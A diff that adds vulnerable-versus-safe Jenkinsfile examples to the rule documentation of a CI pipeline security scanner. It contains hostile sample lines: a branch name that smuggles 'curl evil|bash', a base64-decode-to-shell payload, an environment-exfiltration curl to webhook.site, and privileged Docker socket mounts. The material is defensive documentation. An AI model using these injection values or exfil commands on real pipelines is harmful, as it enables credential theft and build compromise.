@@ -9893,6 +9893,46 @@ pipeline {
 
 **Recommendation.** Switch the affected `sh`/`bat`/`powershell` step to a single-quoted string (Groovy doesn't interpolate single quotes), and pass values through a quoted shell variable (`sh 'echo "$BRANCH"'` after `withEnv([...])`).
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``$CHANGE_BRANCH`` (or ``$GIT_BRANCH`` /
+// ``$ghprbSourceBranch`` / ``$BUILD_USER``) comes from
+// branch metadata or build cause. A branch named
+// ``feat;curl evil|bash;`` lands in the sh body verbatim;
+// the injected curl runs in the build's shell.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh "echo Building $CHANGE_BRANCH"
+        sh "./build.sh --branch $CHANGE_BRANCH"
+      }
+    }
+  }
+}
+
+// Safe: pass the untrusted value through a Groovy-side
+// env binding and reference the shell var with quoting.
+// Groovy's single-quoted string never interpolates;
+// the value reaches sh as one literal argument.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh '''
+          branch="$CHANGE_BRANCH"
+          echo "Building $branch"
+          ./build.sh --branch "$branch"
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-002`](../providers/jenkins.md#jf-002) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-003`: Pipeline uses `agent any` (no executor isolation) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-003 }
@@ -9961,6 +10001,48 @@ pipeline {
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: a credential-shaped literal in the
+// Jenkinsfile body. Any repo reader sees it; the
+// console log echoes it whenever the step prints env.
+pipeline {
+  agent any
+  environment {
+    AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'
+    AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
+  }
+  stages {
+    stage('upload') {
+      steps {
+        sh 'aws s3 cp ./build s3://bucket/'
+      }
+    }
+  }
+}
+
+// Safe: bind a Jenkins Credentials entry via
+// withCredentials. The secret resolves at runtime,
+// is masked in console output, rotates in the
+// Credentials store.
+pipeline {
+  agent any
+  stages {
+    stage('upload') {
+      steps {
+        withCredentials([usernamePassword(
+          credentialsId: 'aws-uploader',
+          usernameVariable: 'AWS_ACCESS_KEY_ID',
+          passwordVariable: 'AWS_SECRET_ACCESS_KEY')]) {
+          sh 'aws s3 cp ./build s3://bucket/'
+        }
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-008`](../providers/jenkins.md#jf-008) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-009`: Agent docker image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-009 }
@@ -9970,6 +10052,37 @@ pipeline {
 **How this is detected.** `agent { docker { image 'name:tag' } }` is not digest-pinned, so a repointed registry tag silently swaps the executor under every subsequent build. Unlike the YAML providers, Jenkins has no separate tag-pinning check, so this one fires at HIGH regardless of whether the tag is floating or immutable.
 
 **Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``image 'maven:3.9'`` is a mutable tag.
+// Docker Hub's maven team rebuilds it on every Maven
+// point release; a publisher takeover ships code into
+// every Jenkins build using the tag.
+pipeline {
+  agent {
+    docker { image 'maven:3.9' }
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+
+// Safe: pin to the content-addressable digest.
+pipeline {
+  agent {
+    docker { image 'maven@sha256:abc123...' }  // maven:3.9.5-eclipse-temurin-21
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+```
 
 **Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -9982,6 +10095,46 @@ pipeline {
 **Recommendation.** Replace the literal with a credentials-store reference: `AWS_ACCESS_KEY_ID = credentials('aws-prod-key')`. Better: switch to the AWS plugin's role binding (`withAWS(role: 'arn:…')`) so the build assumes a short-lived role per run.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: long-lived AWS keys hard-coded in
+// ``environment { }`` block. Same leak surface as
+// JF-008 plus the long-lived-credential gap (no
+// rotation, full account access for as long as the
+// repo reader keeps the value).
+pipeline {
+  agent any
+  environment {
+    AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'
+    AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
+  }
+  stages {
+    stage('deploy') {
+      steps { sh 'aws deploy ...' }
+    }
+  }
+}
+
+// Safe: federate via Jenkins OIDC plugin (or
+// instance-profile / IRSA on a Kubernetes agent) so
+// the keys never exist as long-lived material. The
+// trust policy on the IAM role pins the Jenkins
+// instance / branch as the subject.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        withAWS(role: 'arn:aws:iam::123:role/deploy', useNode: true) {
+          sh 'aws deploy ...'
+        }
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-010`](../providers/jenkins.md#jf-010) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -10105,6 +10258,43 @@ pipeline {
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``curl | bash`` install one-liner trusts
+// both the network path and the installer host. A
+// MITM or compromised endpoint runs in the build's
+// shell with the build's full credential set.
+pipeline {
+  agent any
+  stages {
+    stage('install') {
+      steps {
+        sh 'curl -fsSL https://installer.example.com/cli.sh | bash'
+      }
+    }
+  }
+}
+
+// Safe: download, verify a sha256 digest from a
+// trusted source, then execute.
+pipeline {
+  agent any
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          set -e
+          curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+          echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+          bash /tmp/cli.sh
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-016`](../providers/jenkins.md#jf-016) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-017 }
@@ -10117,6 +10307,42 @@ pipeline {
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``docker run --privileged`` plus the
+// host Docker socket inside a Jenkins agent gives the
+// container full kernel access and the agent's
+// runtime. A compromise escapes to the agent and
+// reaches every other build on the agent.
+pipeline {
+  agent any
+  stages {
+    stage('integration') {
+      steps {
+        sh '''docker run --privileged \
+          -v /var/run/docker.sock:/var/run/docker.sock \
+          myapp:test ./integration.sh'''
+      }
+    }
+  }
+}
+
+// Safe: drop ``--privileged`` and the socket mount. If
+// the build needs to build images, use Kaniko /
+// BuildKit rootless instead.
+pipeline {
+  agent any
+  stages {
+    stage('integration') {
+      steps {
+        sh 'docker run myapp@sha256:abc123... ./integration.sh'
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-017`](../providers/jenkins.md#jf-017) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-018 }
@@ -10128,6 +10354,42 @@ pipeline {
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: pip uses a plaintext-HTTP index and
+// ``--trusted-host`` silences hash verification.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url http://internal-pypi.example.com/simple \
+            --trusted-host internal-pypi.example.com -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+
+// Safe: HTTPS + ``--require-hashes``. Internal CA
+// installed in the agent image's trust store.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url https://internal-pypi.example.com/simple \
+            --require-hashes -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -10233,6 +10495,43 @@ pipeline {
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``git -c http.sslverify=false clone``
+// (or ``npm config set strict-ssl false``,
+// ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables
+// certificate verification. Any network attacker MITMs
+// the registry / remote and ships substituted bytes.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh 'git -c http.sslverify=false clone https://internal/repo.git'
+      }
+    }
+  }
+}
+
+// Safe: install the missing CA into the agent's trust
+// store and keep verification on.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh '''
+          sudo cp /var/jenkins_home/ca/internal.crt /usr/local/share/ca-certificates/
+          sudo update-ca-certificates
+          git clone https://internal/repo.git
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-024`: `input` approval step missing submitter restriction <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-024 }
@@ -10252,6 +10551,58 @@ pipeline {
 **How this is detected.** JF-017 flags inline ``docker run`` commands. This rule targets the other privileged-mode entry point: Jenkins' Kubernetes plugin lets pipelines declare ``agent { kubernetes { yaml '''...''' } }``. A pod running with ``privileged: true`` or mounting ``hostPath: /`` gives the build container the same blast radius, container escape, node-credential theft, cross-tenant contamination on a shared cluster.
 
 **Recommendation.** Remove ``privileged: true`` from the embedded pod YAML, drop ``hostPath``/``hostNetwork``/``hostPID``/``hostIPC`` entries, and add a ``securityContext`` with ``runAsNonRoot: true`` and a ``readOnlyRootFilesystem``. If Docker-in-Docker is genuinely required, use a rootless daemon (e.g. sysbox) or run the build on a dedicated privileged pool with stricter branch protection.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: a Kubernetes agent pod template runs
+// containers as privileged and mounts hostPath. The
+// agent pod escapes to the node; the node hosts every
+// other agent pod on the cluster.
+pipeline {
+  agent {
+    kubernetes {
+      yaml '''
+        spec:
+          containers:
+            - name: dind
+              image: docker:24-dind
+              securityContext:
+                privileged: true
+              volumeMounts:
+                - name: dockersock
+                  mountPath: /var/run/docker.sock
+          volumes:
+            - name: dockersock
+              hostPath: { path: /var/run/docker.sock }
+      '''
+    }
+  }
+  stages { stage('build') { steps { sh 'docker build .' } } }
+}
+
+// Safe: rootless builder (Kaniko / BuildKit) in a
+// non-privileged container. No host path, no host
+// kernel namespace access.
+pipeline {
+  agent {
+    kubernetes {
+      yaml '''
+        spec:
+          containers:
+            - name: kaniko
+              image: gcr.io/kaniko-project/executor@sha256:abc123...
+              securityContext:
+                runAsNonRoot: true
+                runAsUser: 1000
+                allowPrivilegeEscalation: false
+                capabilities: { drop: [ALL] }
+      '''
+    }
+  }
+  stages { stage('build') { steps { sh '/kaniko/executor --context=. --destination=registry/app:tag' } } }
+}
+```
 
 **Source:** [`JF-025`](../providers/jenkins.md#jf-025) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -10298,6 +10649,39 @@ pipeline {
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: a stage body executes a base64-decoded
+// payload, exfils to a third-party webhook, or runs a
+// known miner binary. A malicious PR (or a compromised
+// maintainer) lands the payload in the Jenkinsfile;
+// every subsequent build runs it.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh '''
+          echo Z2g6Li4uIA== | base64 -d | sh
+          curl https://webhook.site/abc?env=$(env|base64)
+        '''
+      }
+    }
+  }
+}
+
+// Safe: the build does only what the build does. No
+// obfuscated execution, no exfil POSTs, no
+// base64 -d | sh pipelines.
+pipeline {
+  agent any
+  stages {
+    stage('build') { steps { sh 'make build' } }
+  }
+}
+```
+
 **Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-030`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-030 }
@@ -10311,6 +10695,45 @@ pipeline {
 **Known false positives.**
 
 - ``sh 'eval "$(ssh-agent -s)"'`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``eval`` on a value that came from a
+// build parameter (or any non-step source) gives the
+// value full shell-grammar reach. The same shape
+// applies to ``sh -c`` on an unquoted variable.
+pipeline {
+  agent any
+  parameters {
+    string(name: 'CMD', defaultValue: 'echo hi')
+  }
+  stages {
+    stage('dispatch') {
+      steps {
+        sh "eval $CMD"
+      }
+    }
+  }
+}
+
+// Safe: pass the parameter to a script you own as a
+// quoted argument; let the script validate against
+// an allow-list. Never eval values from parameters.
+pipeline {
+  agent any
+  parameters {
+    choice(name: 'TARGET', choices: ['staging', 'prod'])
+  }
+  stages {
+    stage('dispatch') {
+      steps {
+        sh './scripts/dispatch.sh "$TARGET"'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-030`](../providers/jenkins.md#jf-030) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -10338,6 +10761,33 @@ pipeline {
 
 - Author-controlled environment refs like ``${env.JOB_NAME}`` or ``${env.BUILD_NUMBER}`` are intentionally not flagged, those values come from Jenkins itself, not from the triggerer. Pipelines that intentionally select agents via a vetted parameter and gate the assignment behind a Groovy validator should suppress with ``.pipelinecheckignore`` and a rationale rather than disable the rule everywhere.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``agent { label "${env.LABEL_PARAM}" }``
+// or ``agent { label "$JOB_BASE_NAME" }`` lets the
+// pusher pick which agent runs the job. A branch /
+// PR named after a privileged label routes the build
+// to an agent it was never meant to reach.
+pipeline {
+  agent { label "${env.JOB_BASE_NAME}" }
+  stages {
+    stage('deploy') { steps { sh './deploy.sh' } }
+  }
+}
+
+// Safe: pin the label to a static literal that
+// matches your runner-targeting policy. Production
+// agents should also enforce the label server-side
+// via Jenkins node config.
+pipeline {
+  agent { label 'linux-amd64' }
+  stages {
+    stage('deploy') { steps { sh './deploy.sh' } }
+  }
+}
+```
+
 **Source:** [`JF-032`](../providers/jenkins.md#jf-032) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-033`: withCredentials secret leaked via Groovy ${...} interpolation in sh step <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-033 }
@@ -10351,6 +10801,44 @@ pipeline {
 **Known false positives.**
 
 - Bindings whose variable name doesn't look credential-ish (e.g. ``variable: 'COUNT'``) are still flagged: any value bound through ``withCredentials`` is a credential by definition.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: Groovy interpolates ``${PASSWORD}`` INTO
+// the sh body BEFORE the shell sees it. The actual
+// secret value lands in the rendered script in plain
+// view; the build log shows it verbatim because
+// Jenkins' masking only watches the env-binding name.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        withCredentials([string(credentialsId: 'api-token', variable: 'TOKEN')]) {
+          sh "curl -H 'Authorization: Bearer ${TOKEN}' https://api.example.com"
+        }
+      }
+    }
+  }
+}
+
+// Safe: single-quote the sh body so Groovy does NOT
+// interpolate; the shell receives the literal ``$TOKEN``
+// and the env-binding masking covers the output.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        withCredentials([string(credentialsId: 'api-token', variable: 'TOKEN')]) {
+          sh 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com'
+        }
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-033`](../providers/jenkins.md#jf-033) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -10366,6 +10854,50 @@ pipeline {
 
 - A pipeline that intentionally uses ``password()`` for a non-secret value (e.g. a one-off prompt for a confirmation token) is still flagged, the parameter type itself is the anti-pattern. Suppress via ``.pipelinecheckignore`` with a rationale rather than disabling the rule.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``password()`` build parameters are NOT
+// stored encrypted at rest; they live in the build's
+// metadata as plain text, are visible to anyone with
+// build-read, and persist for the build's full
+// retention window.
+pipeline {
+  agent any
+  parameters {
+    password(name: 'DEPLOY_KEY', defaultValue: '', description: 'production deploy key')
+  }
+  stages {
+    stage('deploy') {
+      steps { sh 'echo $DEPLOY_KEY | ./deploy.sh' }
+    }
+  }
+}
+
+// Safe: store the secret in Jenkins Credentials and
+// surface a ``credentials()`` parameter that resolves
+// at runtime. The actual value is in the encrypted
+// credentials store; the parameter is just a reference.
+pipeline {
+  agent any
+  parameters {
+    credentials(name: 'DEPLOY_KEY_ID',
+                credentialType:
+                  'org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl',
+                required: true)
+  }
+  stages {
+    stage('deploy') {
+      steps {
+        withCredentials([string(credentialsId: "${params.DEPLOY_KEY_ID}", variable: 'KEY')]) {
+          sh 'echo $KEY | ./deploy.sh'
+        }
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-034`](../providers/jenkins.md#jf-034) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-035`: httpRequest step disables SSL verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-035 }
@@ -10375,6 +10907,42 @@ pipeline {
 **How this is detected.** The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.
 
 **Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``httpRequest`` with
+// ``ignoreSslErrors: true`` disables certificate
+// verification on the request. A MITM proxy or DNS
+// hijack between Jenkins and the API endpoint
+// substitutes the response, and the build trusts
+// whatever bytes arrive.
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json',
+                    ignoreSslErrors: true
+      }
+    }
+  }
+}
+
+// Safe: keep TLS verification on. For internal APIs on
+// a private CA, install the CA into the Jenkins JVM
+// trust store via the Java keystore (cacerts).
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).
 
